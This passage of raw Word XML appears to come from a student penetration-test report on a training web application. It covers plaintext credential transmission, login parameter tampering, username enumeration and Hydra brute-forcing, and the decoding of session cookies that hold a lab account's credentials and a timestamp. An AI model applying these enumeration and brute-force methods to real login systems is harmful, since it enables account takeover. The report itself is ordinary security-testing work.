        <w:t xml:space="preserve">en the user created the second account. This shows that the usernames are all unique, but the system does not tell the user </w:t>
      </w:r>
      <w:r w:rsidR="0063596A">
        <w:t xml:space="preserve">if </w:t>
      </w:r>
      <w:r w:rsidR="00F453B0">
        <w:t>the user</w:t>
      </w:r>
      <w:r w:rsidR="0063596A">
        <w:t>name they are trying to register</w:t>
      </w:r>
      <w:r w:rsidR="00F453B0">
        <w:t xml:space="preserve"> already exists.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A34C04D" w14:textId="77777777" w:rsidR="000E7BC7" w:rsidRDefault="000E7BC7" w:rsidP="000E7BC7">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="25" w:name="_Toc531104343"/>
      <w:r>
        <w:t>Check for Unsafe Transmission of Credentials</w:t>
      </w:r>
      <w:bookmarkEnd w:id="25"/>
    </w:p>
    <w:p w14:paraId="24C1FC8D" w14:textId="56BB2C15" w:rsidR="000E7BC7" w:rsidRDefault="000E7BC7" w:rsidP="000E7BC7">
      <w:r>
        <w:t>As found in the previous stage, the application stores the login credentials in a cookie. The application also transmits sensitive data in plain text. For example</w:t>
      </w:r>
      <w:r w:rsidR="00203F64">
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> when logging in, </w:t>
      </w:r>
      <w:r w:rsidR="00123585">
        <w:t>the headers can be captured to view the username and password being passed.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16C27C7B" w14:textId="77777777" w:rsidR="0090381F" w:rsidRPr="0090381F" w:rsidRDefault="0090381F" w:rsidP="00606113">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Fail-Open</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CA6C48D" w14:textId="1CC97396" w:rsidR="00606113" w:rsidRDefault="00203F64" w:rsidP="00324C8E">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:t>When loggin</w:t>
      </w:r>
      <w:r w:rsidR="002855D6">
        <w:t>g</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in through the login page, the </w:t>
      </w:r>
      <w:r w:rsidR="0090381F">
        <w:t xml:space="preserve">request parameters </w:t>
      </w:r>
      <w:r w:rsidR="002855D6">
        <w:t>are the username and password. T</w:t>
      </w:r>
      <w:r w:rsidR="0090381F">
        <w:t>his is displayed in the header as “</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="0090381F" w:rsidRPr="0090381F">
        <w:t>magaca</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="0090381F" w:rsidRPr="0090381F">
        <w:t>=hacklab%40hacklab.com&amp;furaha=hacklab1&amp;submit=+Login</w:t>
      </w:r>
      <w:r w:rsidR="0090381F">
        <w:t>”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10036629" w14:textId="36DE3B89" w:rsidR="0090381F" w:rsidRDefault="0090381F" w:rsidP="00324C8E">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:t>Upon editing the parameters submitted to the application, none of the changes allowed a successful login. Instead they would display th</w:t>
      </w:r>
      <w:r w:rsidR="00606113">
        <w:t xml:space="preserve">e message seen in Figure </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00606113">
        <w:t>18</w:t>
      </w:r>
      <w:r>
        <w:t>, and</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> redirect back to the login page. The parameter changes attempted were:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D72E997" w14:textId="77777777" w:rsidR="0090381F" w:rsidRDefault="0090381F" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:keepNext/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Submit an empty </w:t>
      </w:r>
      <w:r w:rsidR="005B6AA4">
        <w:t>string</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> as the value</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C78369F" w14:textId="77777777" w:rsidR="0090381F" w:rsidRDefault="0090381F" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:keepNext/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Remove the parameter</w:t>
      </w:r>
      <w:r w:rsidR="005B6AA4">
        <w:t xml:space="preserve"> names</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AD459D6" w14:textId="53695F84" w:rsidR="0090381F" w:rsidRDefault="005B6AA4" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:keepNext/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Submit very long and very </w:t>
      </w:r>
      <w:r w:rsidR="002855D6">
        <w:t>short</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> responses</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F874C1F" w14:textId="77777777" w:rsidR="005B6AA4" w:rsidRDefault="005B6AA4" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:keepNext/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Submit strings instead of numbers, and vice versa</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="248011E3" w14:textId="77777777" w:rsidR="005B6AA4" w:rsidRDefault="005B6AA4" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:keepNext/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Submit the parameter multiple times with different values.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="603AF606" w14:textId="77777777" w:rsidR="002E6ECE" w:rsidRDefault="00843986" w:rsidP="00843986">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="26" w:name="_Toc531104345"/>
      <w:r>
        <w:t>Exploit Vulnerabilities to Gain Unauthorized Access</w:t>
      </w:r>
      <w:bookmarkEnd w:id="26"/>
    </w:p>
    <w:p w14:paraId="50FD25BC" w14:textId="77777777" w:rsidR="005B6AA4" w:rsidRDefault="005B6AA4" w:rsidP="005B6AA4">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="07475727" w14:textId="77777777" w:rsidR="008F60ED" w:rsidRDefault="008F60ED" w:rsidP="005B6AA4">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Username guessing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56E71675" w14:textId="467C8BDC" w:rsidR="008F60ED" w:rsidRDefault="008F60ED" w:rsidP="005B6AA4">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Due to the application highlighting when an invalid username is entered, it would be possible to </w:t>
      </w:r>
      <w:r w:rsidR="00606113">
        <w:t xml:space="preserve">use Hydra </w:t>
      </w:r>
      <w:r w:rsidR="00606113" w:rsidRPr="00606113">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t xml:space="preserve">(THC Hydra – </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00606113" w:rsidRPr="00606113">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>SecTools</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00606113" w:rsidRPr="00606113">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t xml:space="preserve"> Top Network Security Tools, 2018)</w:t>
      </w:r>
      <w:r w:rsidR="00606113">
        <w:t xml:space="preserve"> to brute force the usernames</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and return when a valid username is found. </w:t>
      </w:r>
      <w:r w:rsidR="00606113">
        <w:t>When the message saying “Username not found” appears, the hacker knows the username does not exist. If no such message appears, then the username is valid.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A55758B" w14:textId="77777777" w:rsidR="008F60ED" w:rsidRDefault="008F60ED" w:rsidP="005B6AA4">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Password guessing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B8B5D0B" w14:textId="7C240B40" w:rsidR="008F60ED" w:rsidRDefault="008F60ED" w:rsidP="005B6AA4">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:t>After a valid username has been found, password cracking tools such as hydra can be used</w:t>
      </w:r>
      <w:r w:rsidR="00606113">
        <w:t xml:space="preserve"> again</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to brute force the </w:t>
      </w:r>
      <w:r w:rsidR="00606113">
        <w:t>password</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. This is due to there being no limit on the </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>amount</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> of attempts that can be made to crack a password. Brute force attacks are also more likely to be successful as there is no limit on how small a password can be. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C7D3919" w14:textId="77777777" w:rsidR="008F60ED" w:rsidRDefault="008F60ED" w:rsidP="008F60ED">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="27" w:name="_Toc531104346"/>
      <w:r>
        <w:t>Test the Session Management Mechanism</w:t>
      </w:r>
      <w:bookmarkEnd w:id="27"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12DFDDDC" w14:textId="7EA37BEF" w:rsidR="00F1351D" w:rsidRDefault="00432C45" w:rsidP="00F1351D">
      <w:r>
        <w:t>As discovered in the previous sections, the secret cookie is unique to each user. The information c</w:t>
      </w:r>
      <w:r w:rsidR="00171247">
        <w:t xml:space="preserve">ontained </w:t>
      </w:r>
      <w:r>
        <w:t>within the secret cookie includes</w:t>
      </w:r>
      <w:r w:rsidR="002855D6">
        <w:t xml:space="preserve"> the </w:t>
      </w:r>
      <w:r w:rsidR="007A3A59">
        <w:t>users’</w:t>
      </w:r>
      <w:r w:rsidR="002855D6">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00171247">
        <w:t>username</w:t>
      </w:r>
      <w:r>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="00171247">
        <w:t xml:space="preserve"> password</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and</w:t>
      </w:r>
      <w:r w:rsidR="00171247">
        <w:t xml:space="preserve"> some unknown numbers. </w:t>
      </w:r>
      <w:r>
        <w:t>Due to the cookie containing the username and password of the user, session hijacking</w:t>
      </w:r>
      <w:r w:rsidR="00E804EC">
        <w:t xml:space="preserve"> using the secret cookie</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is unnecessary as all the needed credentials are already acquired</w:t>
      </w:r>
      <w:r w:rsidR="00171247">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="314F0D33" w14:textId="170B8F91" w:rsidR="006D6BB7" w:rsidRDefault="002855D6" w:rsidP="00F1351D">
      <w:r>
        <w:t xml:space="preserve">In order to </w:t>
      </w:r>
      <w:r w:rsidR="00432C45">
        <w:t>understand the</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> pattern </w:t>
      </w:r>
      <w:r w:rsidR="00DD789C">
        <w:t>betwee</w:t>
      </w:r>
      <w:r w:rsidR="00432C45">
        <w:t>n the numbers at the end of the</w:t>
      </w:r>
      <w:r w:rsidR="00DD789C">
        <w:t xml:space="preserve"> cookie, a</w:t>
      </w:r>
      <w:r w:rsidR="006D6BB7">
        <w:t xml:space="preserve"> large </w:t>
      </w:r>
      <w:r w:rsidR="00DD789C">
        <w:t>number</w:t>
      </w:r>
      <w:r w:rsidR="006D6BB7">
        <w:t xml:space="preserve"> of cookies were gathered</w:t>
      </w:r>
      <w:r w:rsidR="00DD789C">
        <w:t xml:space="preserve"> for analysis from the </w:t>
      </w:r>
      <w:hyperlink r:id="rId54" w:history="1">
        <w:r w:rsidR="00DD789C" w:rsidRPr="00D9026A">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>hacklab@hacklab.com</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00DD789C">
        <w:t xml:space="preserve"> user</w:t>
      </w:r>
      <w:r w:rsidR="006D6BB7">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>during the login stage. Burp repeater was used to capture</w:t>
      </w:r>
      <w:r w:rsidR="00A613FB">
        <w:t xml:space="preserve"> and repeat</w:t>
      </w:r>
      <w:r w:rsidR="00432C45">
        <w:t xml:space="preserve"> these login attempts</w:t>
      </w:r>
      <w:r w:rsidR="00A613FB">
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="00432C45">
        <w:t xml:space="preserve"> and the</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006D6BB7">
        <w:t>cookies are a</w:t>
      </w:r>
      <w:r w:rsidR="00DD789C">
        <w:t>s follow</w:t>
      </w:r>
      <w:r w:rsidR="006D6BB7">
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40BA33EC" w14:textId="77777777" w:rsidR="006D6BB7" w:rsidRDefault="006D6BB7" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006D6BB7">
        <w:t>dW5weHlub0B1bnB4eW5vLnBiejp1bnB4eW5vOjE1Mzk4ODM4NDE%3D</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4266A8C5" w14:textId="77777777" w:rsidR="006D6BB7" w:rsidRDefault="006D6BB7" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006D6BB7">
        <w:t>dW5weHlub0B1bnB4eW5vLnBiejp1bnB4eW5vOjE1Mzk4ODM4NTk%3D</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="776564B4" w14:textId="77777777" w:rsidR="006D6BB7" w:rsidRDefault="006D6BB7" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006D6BB7">
        <w:t>dW5weHlub0B1bnB4eW5vLnBiejp1bnB4eW5vOjE1Mzk4ODM4NzM%3D</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07D5571D" w14:textId="77777777" w:rsidR="006D6BB7" w:rsidRDefault="006D6BB7" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006D6BB7">
        <w:t>dW5weHlub0B1bnB4eW5vLnBiejp1bnB4eW5vOjE1Mzk4ODM4ODk%3D</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E7BA19E" w14:textId="77777777" w:rsidR="006D6BB7" w:rsidRDefault="006D6BB7" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006D6BB7">
        <w:t>dW5weHlub0B1bnB4eW5vLnBiejp1bnB4eW5vOjE1Mzk4ODM5MDA%3D</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07F3F914" w14:textId="77777777" w:rsidR="006D6BB7" w:rsidRDefault="006D6BB7" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006D6BB7">
        <w:lastRenderedPageBreak/>
        <w:t>dW5weHlub0B1bnB4eW5vLnBiejp1bnB4eW5vOjE1Mzk4ODM5MDk%3D</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35A71D1A" w14:textId="77777777" w:rsidR="006D6BB7" w:rsidRDefault="006D6BB7" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006D6BB7">
        <w:t>dW5weHlub0B1bnB4eW5vLnBiejp1bnB4eW5vOjE1Mzk4ODM5MjQ%3D</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6714480F" w14:textId="77777777" w:rsidR="006D6BB7" w:rsidRDefault="006D6BB7" w:rsidP="00875A29">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006D6BB7">
        <w:t>dW5weHlub0B1bnB4eW5vLnBiejp1bnB4eW5vOjE1Mzk4ODM5MzM%3D</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="101D4A95" w14:textId="77777777" w:rsidR="006D6BB7" w:rsidRDefault="006D6BB7" w:rsidP="00F1351D">
      <w:r>
        <w:t>These translate into:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EC2F585" w14:textId="77777777" w:rsidR="006D6BB7" w:rsidRDefault="00EA689B" w:rsidP="00F1351D">
      <w:hyperlink r:id="rId55" w:history="1">
        <w:r w:rsidR="006D6BB7" w:rsidRPr="00777C00">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>hacklab@hacklab.com:hacklab:15398838417</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="006D6BB7" w:rsidRPr="006D6BB7">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2851BC6B" w14:textId="77777777" w:rsidR="00F1351D" w:rsidRDefault="00EA689B" w:rsidP="00F1351D">
      <w:hyperlink r:id="rId56" w:history="1">
        <w:r w:rsidR="006D6BB7" w:rsidRPr="00777C00">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>hacklab@hacklab.com:hacklab:15398838597</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="006D6BB7" w:rsidRPr="006D6BB7">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62B62B30" w14:textId="77777777" w:rsidR="006D6BB7" w:rsidRDefault="00EA689B" w:rsidP="00F1351D">
      <w:hyperlink r:id="rId57" w:history="1">
        <w:r w:rsidR="006D6BB7" w:rsidRPr="00777C00">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>hacklab@hacklab.com:hacklab:15398838737</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="006D6BB7" w:rsidRPr="006D6BB7">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01A3B3DF" w14:textId="77777777" w:rsidR="0045300A" w:rsidRDefault="00EA689B" w:rsidP="00F1351D">
      <w:hyperlink r:id="rId58" w:history="1">
        <w:r w:rsidR="0045300A" w:rsidRPr="00777C00">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>hacklab@hacklab.com:hacklab:15398838897</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="006D6BB7" w:rsidRPr="006D6BB7">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="003826EA" w14:textId="77777777" w:rsidR="0045300A" w:rsidRDefault="00EA689B" w:rsidP="00F1351D">
      <w:hyperlink r:id="rId59" w:history="1">
        <w:r w:rsidR="0045300A" w:rsidRPr="00777C00">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>hacklab@hacklab.com:hacklab:15398839007</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="0045300A" w:rsidRPr="0045300A">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05399BA1" w14:textId="77777777" w:rsidR="0045300A" w:rsidRDefault="00EA689B" w:rsidP="00F1351D">
      <w:hyperlink r:id="rId60" w:history="1">
        <w:r w:rsidR="0045300A" w:rsidRPr="00777C00">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>hacklab@hacklab.com:hacklab:15398839247</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="0045300A" w:rsidRPr="0045300A">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E142C72" w14:textId="77777777" w:rsidR="0045300A" w:rsidRDefault="00EA689B" w:rsidP="00F1351D">
      <w:hyperlink r:id="rId61" w:history="1">
        <w:r w:rsidR="0045300A" w:rsidRPr="00777C00">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>hacklab@hacklab.com:hacklab:15398839337</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="0045300A" w:rsidRPr="0045300A">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36F9BAEC" w14:textId="2D6CE585" w:rsidR="00A60D45" w:rsidRDefault="0045300A" w:rsidP="00F1351D">
      <w:r>
        <w:t xml:space="preserve">It is clear that the numbers at the end are </w:t>
      </w:r>
      <w:r w:rsidR="00A60D45">
        <w:t>increasing</w:t>
      </w:r>
      <w:r w:rsidR="00DD789C">
        <w:t>, and that the “7.” i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s not actually </w:t>
      </w:r>
      <w:r w:rsidR="00A60D45">
        <w:t>included in this process</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> like the preceding numbers. Th</w:t>
      </w:r>
      <w:r w:rsidR="00A60D45">
        <w:t xml:space="preserve">ese numbers could represent the </w:t>
      </w:r>
      <w:r w:rsidR="00DD789C">
        <w:t>number</w:t>
      </w:r>
      <w:r w:rsidR="00A60D45">
        <w:t xml:space="preserve"> of seconds that have passed between each request. </w:t>
      </w:r>
      <w:r>
        <w:t>To test this theory, a cookie was generated, and then 7 secon</w:t>
      </w:r>
      <w:r w:rsidR="00DD789C">
        <w:t xml:space="preserve">ds was waited before </w:t>
      </w:r>
      <w:r w:rsidR="00CF7DF4">
        <w:t>the next</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> cookie</w:t>
      </w:r>
      <w:r w:rsidR="00A60D45">
        <w:t xml:space="preserve"> was generated</w:t>
      </w:r>
      <w:r>
        <w:t>. The</w:t>
      </w:r>
      <w:r w:rsidR="00DD789C">
        <w:t>se</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A60D45">
        <w:t>cookies</w:t>
      </w:r>
      <w:r w:rsidR="00432C45">
        <w:t xml:space="preserve">, when decrypted, were </w:t>
      </w:r>
      <w:hyperlink r:id="rId62" w:history="1">
        <w:r w:rsidR="00A60D45" w:rsidRPr="00777C00">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>hacklab@hacklab.com:hacklab:15398843877</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00A60D45">
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:hyperlink r:id="rId63" w:history="1">
        <w:r w:rsidR="00A60D45" w:rsidRPr="00777C00">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>hacklab@hacklab.com:hacklab:15398843947</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00A60D45">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2584B3B7" w14:textId="2D614248" w:rsidR="00A60D45" w:rsidRDefault="00A60D45" w:rsidP="00F1351D">
      <w:r>
        <w:t xml:space="preserve">The difference between the numbers 1539884387 and 1539884394 is 7. This is tested again with the decrypted values  </w:t>
      </w:r>
      <w:hyperlink r:id="rId64" w:history="1">
        <w:r w:rsidRPr="00777C00">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>hacklab@hacklab.com:hacklab:15398851517</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:hyperlink r:id="rId65" w:history="1">
        <w:r w:rsidRPr="00777C00">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>hacklab@hacklab.com:hacklab:15398851617</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> with ten seconds </w:t>
      </w:r>
      <w:r w:rsidR="00432C45">
        <w:t xml:space="preserve">waited </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">between </w:t>
      </w:r>
      <w:r w:rsidR="00DD789C">
        <w:t>each request</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="00432C45">
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">difference between </w:t>
      </w:r>
      <w:r w:rsidRPr="00A60D45">
        <w:t>1539885151</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="00A60D45">
        <w:t>1539885161</w:t>
      </w:r>
      <w:r w:rsidR="00DD789C">
        <w:t xml:space="preserve"> is ten. This </w:t>
      </w:r>
      <w:r w:rsidR="00432C45">
        <w:t>evidence proves</w:t>
      </w:r>
      <w:r w:rsidR="00DD789C">
        <w:t xml:space="preserve"> the </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">theory that the numbers at the end of the cookie relate to time passed between each </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>request</w:t>
      </w:r>
      <w:r w:rsidR="00E641CE">
        <w:t>, or</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00E641CE">
        <w:t xml:space="preserve"> are at least related to time in some way</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B86ED02" w14:textId="77777777" w:rsidR="00DB29BC" w:rsidRDefault="009970C2" w:rsidP="00F1351D">
      <w:r>
        <w:t>This means that if</w:t>
      </w:r>
      <w:r w:rsidR="00DB29BC">
        <w:t xml:space="preserve"> the same user</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> logs in at two </w:t>
      </w:r>
      <w:r w:rsidR="00DB29BC">
        <w:t>separate</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00DB29BC">
        <w:t>locations</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, then two separate cookies are generated. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EEF3BC9" w14:textId="41AEB253" w:rsidR="009970C2" w:rsidRDefault="00DB29BC" w:rsidP="00F1351D">
      <w:r>
        <w:t>To test if it is possible to log in at two different locations</w:t>
      </w:r>
      <w:r w:rsidR="00DB0EC0">
        <w:t xml:space="preserve">, the </w:t>
      </w:r>
      <w:hyperlink r:id="rId66" w:history="1">
        <w:r w:rsidR="00DB0EC0" w:rsidRPr="00472BC1">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>hacklab@hacklab.com</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00DB0EC0">
        <w:t xml:space="preserve"> account was logged in on two different machines. </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">The login was accepted on both machines and to test if both accounts </w:t>
      </w:r>
      <w:r w:rsidR="00CF7DF4">
        <w:t>could still perform actions</w:t>
      </w:r>
      <w:r>
        <w:t>, the profile picture of the user was updated on one</w:t>
      </w:r>
      <w:r w:rsidR="00CF7DF4">
        <w:t xml:space="preserve"> account</w:t>
      </w:r>
      <w:r w:rsidR="00DB0EC0">
        <w:t xml:space="preserve">. Upon refreshing the other machine, the profile picture was also updated. </w:t>
      </w:r>
      <w:r w:rsidR="00CF7DF4">
        <w:t>This means that two users can be logged in on the same account, at the same time.</w:t>
      </w:r>
    </w:p>
